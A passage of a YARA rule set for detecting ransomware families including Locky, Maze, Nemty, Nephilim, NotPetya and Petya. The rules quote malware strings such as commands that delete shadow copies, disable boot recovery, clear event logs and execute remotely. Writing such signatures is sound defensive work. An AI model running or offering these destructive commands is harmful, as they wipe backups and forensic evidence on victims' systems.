(LockerGogaFStrings or LockerGogaBinary)\n}\n\nrule Locky_Ransomware\n{\n    meta:\n        description = \"Locky ransomware\"\n        ref = \"https://goo.gl/qScSrE\"\n        classifications = \"Ransomware\"\n        threat_names = \"Locky\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth (with the help of binar.ly)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Locky_Ransomware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 }\n        $o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 }\n\n    condition:\n        all of ($o*)\n}\n\nrule Locky_Ransomware_2 : ransom\n{\n    meta:\n        description = \"Locky ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Locky\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Locky_Ransomware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = { 2E 00 6C 00 6F 00 63 00 6B 00 79 00 00 }\n        $a2 = { 00 5F 00 4C 00 6F 00 63 00 6B 00 79 00 }\n        $a3 = { 5F 00 72 00 65 00 63 00 6F 00 76 00 65 }\n        $a4 = { 00 72 00 5F 00 69 00 6E 00 73 00 74 00 }\n        $a5 = { 72 00 75 00 63 00 74 00 69 00 6F 00 6E }\n        $a6 = { 00 73 00 2E 00 74 00 78 00 74 00 00 }\n        $a7 = { 53 6F 66 74 77 61 72 65 5C 4C 6F 63 6B 79 00 }\n\n    condition:\n        all of them\n}\n\nrule LooCipher\n{\n    meta:\n        description = \"LooCipher ransomware\"\n        classification = \"Ransomware\"\n        threat_names = \"LooCipher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $s1 = \"BTC_ADDRESS\" fullword ascii wide\n        $s2 = \"@Please_Read_Me.txt\" fullword ascii wide\n        $s3 = \"@LooCipher_wallpaper.bmp\" fullword ascii wide\n        $s4 = \"LooCipher\" fullword ascii wide\n        $box1 = \"DECRYPT\" fullword ascii wide\n        $box2 = \"Check Payment\" fullword ascii wide\n        $box3 = \"How to buy Bitcoin\" fullword ascii wide\n        \n    condition:\n        uint16(0) == 0x5a4d and all of ($box*) and 2 of ($s*)\n}\n\nrule LooCipher_PDB_ProjectPath\n{\n    meta:\n        description = \"LooCipher pdb file path\"\n        classification = \"Ransomware\"\n        threat_names = \"LooCipher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        sample = \"924cc338d5d03f8914fe54f184596415563c4172679a950245ac94c80c023c7d\"\n        \n    strings:\n        $pdb_path = \"C:\\\\Users\\\\Usuario\\\\Documents\\\\Proyectos\\\\sher.lock\\\\Debug\\\\LooCipher.pdb\" fullword\n        $project_path = \"c:\\\\users\\\\usuario\\\\documents\\\\proyectos\\\\sher.lock\" fullword\n        \n    condition:\n        uint16(0) == 0x5a4d\n        and any of them\n}\n\nrule LooCipher_Key_Exfiltration\n{\n    meta:\n        description = \"LooCipher's key exfiltration\"\n        classification = \"Ransomware\"\n        threat_names = \"LooCipher\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        sample = \"924cc338d5d03f8914fe54f184596415563c4172679a950245ac94c80c023c7d\"\n        \n    strings:\n        $enc_key = /\\/k\\.php\\?(u=)[a-zA-Z0-9]*(&k=)[0-9]{32}(&i=)([0-9]{1,3}\\.){3}[0-9]{1,3}/\n        \n    condition:\n        vmray_target_class == \"pcap\"\n        and $enc_key\n}\n\nrule MazeEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Maze Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Maze,ChaCha\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/octet-stream\"\n        // Contains marker at the correct offset\n        and (uint32be(filesize-8) == 0x00000000 and uint32be(filesize-4) == 0x66116166)\n        // Is encrypted\n        and math.entropy(0, 500) > 7.5\n}\n\nprivate rule MazeFStrings\n{\n    meta:\n        description = \"Maze Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $r1 = /[a-zA-Z2-7]{16}\\.onion\\/%USERID%/ wide ascii\n        $r2 = /[a-zA-Z2-7]{56}\\.onion\\/%USERID%/ wide ascii\n\n        $s1 = \"%c_%c_%d/%d|\"\n        $s2 = \"Southwire Maze Ransomware\"\n        $s3 = \"MDLab Maze Ransomware\"\n        $s4 = \"City of Pensacola Maze Ransomware\"\n        $s5 = \"%base64key%\"\n        $s6 = \"Logging enabled | Maze\" wide ascii\n        $s7 = \"C:\\\\sf3\\\\jytj43t\\\\a33ewe\\\\WY&WdhJSDIHGDjd.HSgshh\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n        )\n        and 1 of ($r*)\n        and 4 of ($s*)\n}\n\nprivate rule MazeBinary\n{\n    meta:\n        description = \"Maze Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"\\\"%s\\\" shadowcopy delete\" wide ascii\n        $s2 = /POST \\/%s HTTP\\/1.1\\r\\nUser-Agent: %s\\r\\nHost: %s\\r\\nContent-Type: %s\\r\\nContent-Length: %d\\r\\nConnection: Keep-Alive/ wide ascii\n        $s3 = \"http://%s%s\" wide ascii\n        $s4 = \"process call create \\\"cmd /c start %s\\\"\" wide ascii\n        $s5 = \"Encrypting specified folder in --path parameter\" wide ascii\n        $s6 = \"Enc: %s\" wide ascii\n        $s7 = \"Maze Ransomware\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule Maze\n{\n    meta:\n        description = \"Maze Ransomware\"\n        classification = \"Ransomware\"\n        threat_names = \"Maze,ChaCha\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // arguments\n        $s1 = \"--logging\" wide ascii\n        $s2 = \"--nomutex\" wide ascii\n        $s3 = \"--noshares\" wide ascii\n        $s4 = \"--path\" wide ascii\n        $s5 = \"Select * From AntiVirusPr\" wide ascii\n        $s6 = \"|deprecated > v2.3|\" wide ascii\n        $s7 = \"Win32_ShadowCopy.id='%s'\" wide ascii\n        $s8 = \"select * from Win32_Shado\" wide ascii\n        $s9 = \"Encrypting whole system\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 5 of ($s*) \n        and (MazeFStrings or MazeBinary)\n}\n\nrule NemtyEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Nemty Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nemty\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n        // Contains marker at the end\n        uint32(filesize-13) == 0x544D454E and uint16(filesize-9) == 0x5F59\n        // Is encrypted\n        and math.entropy(0, 200) > 6.5\n}\n\nrule Nemty\n{\n    meta:\n        description = \"Nemty Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nemty\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $positive_01 = \"NEMTY\" ascii\n        $positive_02 = \"DECRYPT.txt\" fullword ascii\n\n        $reg_1 = \"Software\\\\NEMTY\\\\\" ascii\n        $reg_2 = \"Software\\\\TESORION\\\\\" ascii\n\n        $optional_01 = \"/c bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wmic shadowcopy delete\" fullword ascii\n        $optional_02 = \"http://nemty10.\" ascii\n        $optional_03 = \"http://nemty1.\" ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and (all of ($positive_*))\n        and (1 of ($reg*))\n        and (2 of ($optional_*))\n}\n\nrule Nemty_3_1\n{\n    meta:\n        description = \"Nemty Ransomware v3.1\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nemty 3.1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // Config first appeared in version 2.3. Now 3.1 also uses it.\n        $config1 = \"{\\\"fileid\\\":\\\"%fid%\\\",\\\"configid\\\":\\\"%cfgid%\\\",\\\"compid\\\":\\\"%compid%\\\",\\\"ip\\\":\\\"%ip%\\\",\\\"country\\\":\\\"%cnt%\\\",\\\"version\\\":\\\"%ver%\\\",\\\"computer_name\\\":\\\"%compname%\\\",\\\"username\\\":\\\"%user%\\\",\\\"os\\\":\\\"%win%\\\",\\\"pr_key\\\":\\\"%pr%\\\",\\\"drives\\\":[%drives%]}\"\n        $config2 = \"{\\\"drive_type\\\":\\\"%type%\\\",\\\"drive_letter\\\":\\\"%letter%\\\",\\\"total_size\\\":\\\"%total%\\\",\\\"used_size\\\":\\\"%used%\\\"},\"\n\n        $r1 = /[a-zA-Z2-7]{16}\\.onion/ ascii\n        $r2 = /[a-zA-Z2-7]{56}\\.onion/ ascii\n\n        $ver1 = \"NEMTY REVENUE 3.1\" ascii \n        $ver2 = \"\\\"version\\\":\\\"3.1\\\"\" ascii\n\n        $mut = \"Oni platyat po ipoteke, batya v tyur'me, a mama na kreke, domashniy arest, na noge tracker, fake - retsepty v kazhdoy apteke\" fullword ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 1 of ($config*)\n        and 1 of ($r*)\n        and 1 of ($ver*)\n        and $mut\n}\n\nrule Nemty_2_6\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Nemty Ransomware v2.6\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nemty 2.6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n\n    strings:\n        $s1 = \"NEMTY_PRIVATE\"\n        $s2 = \"Naruto Uzumake\"\n        $s3 = \"/c vssadmin resize shadowstorage /for=\"\n        $mut = \"edu v magazi gucccchi v spb, grrrrrraa, ona zhret moi xui kak-budto eto burger...\"\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule Nemty_2_5\n{\n    meta:\n\n        author = \"VMRay Labs\"\n        description = \"Nemty Ransomware v2.5\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nemty 2.5\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        sample = \"e3afc1d8ed2b940a218cd8402a6e53aafeac233b401124ca884e2b2b0eda4601\"\n\n    strings:\n        $p1 = \"Vremya tik-tak... Odinochestvo moi simvol...\" fullword ascii\n        $p2 = \"NEMTY\" fullword ascii\n\n        $s1 = \"pbkey\" fullword ascii\n        $s2 = \"Naruto Uzumake\" ascii\n        $s3 = \"TorDir\" fullword ascii\n        $s4 = \"/c vssadmin resize shadowstorage /for\" fullword ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($p*)\n        and 3 of ($s*)\n}\n\nrule NephilimEncryptedFile\n{\n    meta:\n        description = \"File encrypted by Nephilim Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Nephilim\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/octet-stream\"\n        // Contains marker at the correct offset\n        and (uint32be(filesize-8) == 0x4E455048 and uint32be(filesize-4) == 0x494C494D)\n        // Is encrypted\n        and math.entropy(0, 500) > 7.5\n}\n\nprivate rule NephilimExclusions\n{\n    meta:\n        description = \"List of exclusions for Nephilim\"\n        author = \"VMRay Labs\"\n\n    strings:\n        // ignore\n        $ = \"windows\"\n        $ = \"$RECYCLE.BIN\"\n        $ = \"rsa\"\n        $ = \"log\"\n        $ = \"NTDETECT.COM\"\n        $ = \"ntldr\"\n        $ = \"MSDOS.SYS\"\n        $ = \"IO.SYS\"\n        $ = \"boot.ini\"\n        $ = \"AUTOEXEC.BAT\"\n        $ = \"ntuser.dat\"\n        $ = \"desktop.ini\"\n        $ = \"CONFIG.SYS\"\n        $ = \"RECYCLER\"\n        $ = \"BOOTSECT.BAK\"\n        $ = \"bootmgr\"\n        $ = \"programdata\"\n        $ = \"appdata\"\n        $ = \"program files\"\n        $ = \"program files (x86)\"\n\n        // ignore extensions\n        $ = \".exe\"\n        $ = \".log\"\n        $ = \".cab\"\n        $ = \".cmd\"\n        $ = \".com\"\n        $ = \".cpl\"\n        $ = \".ini\"\n        $ = \".dll\"\n        $ = \".url\"\n        $ = \".ttf\"\n        $ = \".mp3\"\n        $ = \".pif\"\n        $ = \".mp4\"\n        $ = \".msi\"\n        $ = \".lnk\"\n\n    condition:\n        all of them\n}\n\nrule Nephilim\n{\n    meta:\n        description = \"Nephilim Ransomware\"\n        classification = \"Ransomware\"\n        threat_names = \"Nephilim\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"NEPHILIM\" wide ascii\n        // RtlGenRandom\n        $s2 = \"SystemFunction036\" wide ascii\n\n        \n        $o1 = \"ya chubstvuu bol' gde-to v grude, i moi rani v serdce ne zalechit'\" wide ascii\n        $o2 = \"v etom skrucheni problemi i trava\" wide ascii\n        $o3 = \"\\\\god.jpg\" wide ascii\n        $o4 = \"Contact us via email:\" wide ascii\n        $o5 = /[a-zA-Z2-7]{16}\\.onion/ ascii\n        $o6 = /[a-zA-Z2-7]{56}\\.onion/ ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of ($s*) \n        and (3 of ($o*) or NephilimExclusions)\n}\n\nrule NotPetya_Ransomware_Jun17\n{\n    meta:\n        description = \"NotPetya ransomware\"\n        ref = \"https://goo.gl/h6iaGj\"\n        classifications = \"Ransomware\"\n        threat_names = \"NotPetya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"NotPetya_Ransomware_Jun17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Ooops, your important files are encrypted.\" fullword wide ascii\n        $x2 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\\\\"C:\\\\Windows\\\\%s\\\\\\\" #1 \" fullword wide\n        $x3 = \"-d C:\\\\Windows\\\\System32\\\\rundll32.exe \\\"C:\\\\Windows\\\\%s\\\",#1 \" fullword wide\n        $x4 = \"Send your Bitcoin wallet ID and personal installation key to e-mail \" fullword wide\n        $x5 = \"fsutil usn deletejournal /D %c:\" fullword wide\n        $x6 = \"wevtutil cl Setup & wevtutil cl System\" ascii\n        $x7 = { 2C 00 23 00 31 00 20 00 00 00 00 00 00 00 00 00 72 00 75 00 6E\n         00 64 00 6C 00 6C 00 33 00 32 00 2E 00 65 00 78 00 65 00 }\n        $s1 = \"%s /node:\\\"%ws\\\" /user:\\\"%ws\\\" /password:\\\"%ws\\\" \" fullword wide\n        $s4 = \"\\\\\\\\.\\\\pipe\\\\%ws\" fullword wide\n        $s5 = \"schtasks %ws/Create /SC once /TN \\\"\\\" /TR \\\"%ws\\\" /ST %02d:%02d\" fullword wide\n        $s6 = \"u%s \\\\\\\\%s -accepteula -s \" fullword wide\n        $s7 = \"dllhost.dat\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or 3 of them)\n}\n\nprivate rule Paymen_FunctionStrings\n{\n    meta:\n        description = \"Paymen Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"ComSpec\" wide ascii\n        $ = \"C:\\\\Windows\\\\system32\\\\cmd.exe\" wide ascii\n        $ = \".KJHslgjkjdfg\" wide ascii\n        $ = \"m23071644\" wide ascii\n        $ = \"CreateProcessWithTokenW\"\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n        )\n        and all of them\n}\n\nprivate rule Paymen_MemDump\n{\n    meta:\n        description = \"Paymen Ransomware\"\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = {\n                b0 ??\n                88 04 24\n                88 44 24 10\n                b0 ??\n                c6 44 24 01 ??\n                c6 44 24 02 ??\n                c6 44 24 03 ??\n                c6 44 24 04 ??\n                c6 44 24 05 ??\n                c6 44 24 06 ??\n                c6 44 24 07 ??\n                c6 44 24 08 ??\n                c6 44 24 09 ??\n                c6 44 24 0a ??\n                c6 44 24 0b ??\n                c6 44 24 0c ??\n                c6 44 24 0d ??\n                c6 44 24 0e ??\n                c6 44 24 0f ??\n                c6 44 24 11 ??\n                c6 44 24 12 ??\n                c6 44 24 13 ??\n                c6 44 24 14 ??\n                c6 44 24 15 ??\n                88 44 24 16\n                c6 44 24 17 ??\n                c6 44 24 18 ??\n                c6 44 24 19 ??\n                c6 44 24 1a ??\n                c6 44 24 1b ??\n                88 44 24 1c\n                c6 44 24 1d ??\n                c6 44 24 1e ??\n                c6 44 24 1f ?? \n                }\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and all of them\n}\n\nrule Paymen\n{\n    meta:\n        description = \"Paymen Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Paymen\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"-%08X\" wide ascii\n        $s2 = \"\\\"%s\\\" n%u\" wide ascii\n        $s3 = \"\\\\\\\\.\\\\%c:\" wide ascii\n        $s4 = \"%c:\\\\\" wide ascii\n        $s5 = /3\\. Total: %I64d\\.%02I64d gb (%u)\\/%I64d\\.%02I64d gb (%u)\\/%u%%\\r\\n/ wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 4 of ($s*)\n        and (Paymen_MemDump or Paymen_FunctionStrings)\n}\n\nrule PetrWrap\n{\n    meta:\n        description = \"PetrWrap ransomware\"\n        ref = \"https://securelist.com/schroedingers-petya/78870/\"\n        classifications = \"Ransomware\"\n        threat_names = \"PetrWrap\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ransomware_PetrWrap\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcqYLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgqCXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu\" fullword wide\n        $a2 = \".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls\" fullword wide\n        $a3 = \"DESTROY ALL OF YOUR DATA PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\" fullword ascii\n        $a4 = \"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\" fullword ascii\n        $a5 = \"wowsmith123456posteo.net.\" fullword wide\n\n    condition:\n        uint16(0) == 0x5A4D and filesize < 1000000 and any of them\n}\n\nrule FE_CPE_MS17_010_RANSOMWARE\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/06/petya-ransomware-spreading-via-eternalblue-exploit.html\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Ian.Ahl@fireeye.com @TekDefense, Nicholas.Carr@mandiant.com @ItsReallyNick\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"FE_CPE_MS17_010_RANSOMWARE\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $dmap01 = \"\\\\\\\\.\\\\PhysicalDrive\" nocase ascii wide\n        $dmap02 = \"\\\\\\\\.\\\\PhysicalDrive0\" nocase ascii wide\n        $dmap03 = \"\\\\\\\\.\\\\C:\" nocase ascii wide\n        $dmap04 = \"TERMSRV\" nocase ascii wide\n        $dmap05 = \"\\\\admin$\" nocase ascii wide\n        $dmap06 = \"GetLogicalDrives\" nocase ascii wide\n        $dmap07 = \"GetDriveTypeW\" nocase ascii wide\n        $msg01 = \"WARNING: DO NOT TURN OFF YOUR PC!\" nocase ascii wide\n        $msg02 = \"IF YOU ABORT THIS PROCESS\" nocase ascii wide\n        $msg03 = \"DESTROY ALL OF YOUR DATA!\" nocase ascii wide\n        $msg04 = \"PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\" nocase ascii wide\n        $msg05 = \"your important files are encrypted\" ascii wide\n        $msg06 = \"Your personal installation key\" nocase ascii wide\n        $msg07 = \"worth of Bitcoin to following address\" nocase ascii wide\n        $msg08 = \"CHKDSK is repairing sector\" nocase ascii wide\n        $msg09 = \"Repairing file system on \" nocase ascii wide\n        $msg10 = \"Bitcoin wallet ID\" nocase ascii wide\n        $msg11 = \"wowsmith123456@posteo.net\" nocase ascii wide\n        $msg12 = \"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\" nocase ascii wide\n        $msg_pcre = /(en|de)crypt(ion|ed\\.)/\n        $functions01 = \"need dictionary\" nocase ascii wide\n        $functions02 = \"comspec\" nocase ascii wide\n        $functions03 = \"OpenProcessToken\" nocase ascii wide\n        $functions04 = \"CloseHandle\" nocase ascii wide\n        $functions05 = \"EnterCriticalSection\" nocase ascii wide\n        $functions06 = \"ExitProcess\" nocase ascii wide\n        $functions07 = \"GetCurrentProcess\" nocase ascii wide\n        $functions08 = \"GetProcAddress\" nocase ascii wide\n        $functions09 = \"LeaveCriticalSection\" nocase ascii wide\n        $functions10 = \"MultiByteToWideChar\" nocase ascii wide\n        $functions11 = \"WideCharToMultiByte\" nocase ascii wide\n        $functions12 = \"WriteFile\" nocase ascii wide\n        $functions13 = \"CoTaskMemFree\" nocase ascii wide\n        $functions14 = \"NamedPipe\" nocase ascii wide\n        $functions15 = \"Sleep\" nocase ascii wide\n        $cmd01 = \"wevtutil cl Setup\" ascii wide nocase\n        $cmd02 = \"wevtutil cl System\" ascii wide nocase\n        $cmd03 = \"wevtutil cl Security\" ascii wide nocase\n        $cmd04 = \"wevtutil cl Application\" ascii wide nocase\n        $cmd05 = \"fsutil usn deletejournal\" ascii wide nocase\n        $cmd06 = \"schtasks \" nocase ascii wide\n        $cmd07 = \"/Create /SC \" nocase ascii wide\n        $cmd08 = \" /TN \" nocase ascii wide\n        $cmd09 = \"at %02d:%02d %ws\" nocase ascii wide\n        $cmd10 = \"shutdown.exe /r /f\" nocase ascii wide\n        $cmd11 = \"-accepteula -s\" nocase ascii wide\n        $cmd12 = \"wmic\"\n        $cmd13 = \"/node:\" nocase ascii wide\n        $cmd14 = \"process call create\" nocase ascii wide\n\n    condition:\n        3 of ($dmap*) and 2 of ($msg*) and 9 of ($functions*) and 7 of ($cmd*)\n}\n\nrule petya_eternalblue : petya_eternalblue\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"https://blueliv.com/petya-ransomware-cyber-attack-is-spreading-across-the-globe-part-2/\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"blueliv\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"petya_eternalblue\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd01 = \"schtasks %ws/Create /SC once /TN \\\"\\\" /TR \\\"%ws\\\" /ST %02d:%0\" wide\n        $cmd02 = \"shutdown.exe /r /f\" wide\n        $cmd03 = \"%s \\\\\\\\%s -accepteula -s\" wide\n        $cmd04 = \"process call create \\\"C:\\\\Windows\\\\System32\\\\rundll32.exe \\\\\\\"C:\\\\Windows\\\\%s\\\\\\\" #1\" wide\n        $str01 = \"they have been encrypted. Perhaps you are busy looking\" wide\n        $mbr01 = {00 00 00 55 aa e9 ?? ??}\n\n    condition:\n        all of them\n}\n\nrule Petya_Ransomware\n{\n    meta:\n        description = \"Petya ransomware\"\n        ref = \"http://www.heise.de/newsticker/meldung/Erpressungs-Trojaner-Petya-riegelt-den-gesamten-Rechner-ab-3150917.html\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Petya_Ransomware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"<description>WinRAR SFX module</description>\" fullword ascii\n        $s1 = \"BX-Proxy-Manual-Auth\" fullword wide\n        $s2 = \"<!--The ID below indicates application support for Windows 10 -->\" fullword ascii\n        $s3 = \"X-HTTP-Attempts\" fullword wide\n        $s4 = \"@CommandLineMode\" fullword wide\n        $s5 = \"X-Retry-After\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and $a1 and 3 of ($s*)\n}\n\nrule Ransom_Petya\n{\n    meta:\n        description = \"Petya ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Petya\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"CCN-CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Ransom_Petya\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = { C1 C8 14 2B F0 03 F0 2B F0 03 F0 C1 C0 14 03 C2 }\n        $a2 = { 46 F7 D8 81 EA 5A 93 F0 12 F7 DF C1 CB 10 81 F6 }\n        $a3 = { 0C 88 B9 07 87 C6 C1 C3 01 03 C5 48 